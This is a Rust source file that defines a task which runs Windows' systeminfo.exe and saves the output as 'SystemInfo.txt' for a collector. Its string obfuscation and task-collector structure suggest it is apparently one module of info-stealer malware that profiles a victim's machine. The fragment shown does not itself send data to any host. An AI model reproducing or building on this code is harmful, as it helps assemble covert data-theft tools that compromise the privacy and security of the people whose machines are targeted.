use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use collector::Collector;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use utils::process;

pub(super) struct SystemInfoTask;

impl<C: Collector> Task<C> for SystemInfoTask {
    parent_name!("SystemInfo.txt");
    
    unsafe fn run(&self, parent: &Path, _: &C) {
        let system = Path::system();
        
        let res = process::run_file(&(system / s!("systeminfo.exe")));
        if res.is_err() {
            return;
        }
        
        let res = res.unwrap();
        let res = String::from_utf8_lossy(&res);
        let res = res.trim();
        
        let _ = res.write_to(parent);
    }
}